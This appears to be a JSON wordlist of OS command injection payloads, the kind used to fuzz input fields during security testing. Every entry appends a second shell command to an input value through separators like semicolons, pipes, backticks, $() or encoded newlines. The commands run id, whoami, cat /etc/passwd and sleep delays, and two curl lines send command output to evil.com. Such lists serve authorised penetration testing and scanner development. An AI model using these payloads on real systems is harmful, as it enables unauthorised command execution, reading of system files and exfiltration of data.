[
  "; id",
  "| id",
  "|| id",
  "& id",
  "&& id",
  "`id`",
  "$(id)",
  "; whoami",
  "| whoami",
  "&& whoami",
  "; cat /etc/passwd",
  "| cat /etc/passwd",
  "&& cat /etc/passwd",
  "; ls -la",
  "| ls -la",
  "; uname -a",
  "| uname -a",
  "; ping -c 1 127.0.0.1",
  "| ping -c 1 127.0.0.1",
  "; sleep 5",
  "| sleep 5",
  "&& sleep 5",
  "$(sleep 5)",
  "`sleep 5`",
  "; echo vulnerable",
  "1; id",
  "1 | id",
  "1 && id",
  "%0aid",
  "%0a id %0a",
  "127.0.0.1; id",
  "127.0.0.1 | id",
  "127.0.0.1 && id",
  "127.0.0.1 %0a id",
  "; curl http://evil.com/$(id)",
  "| curl http://evil.com/$(whoami)"
]
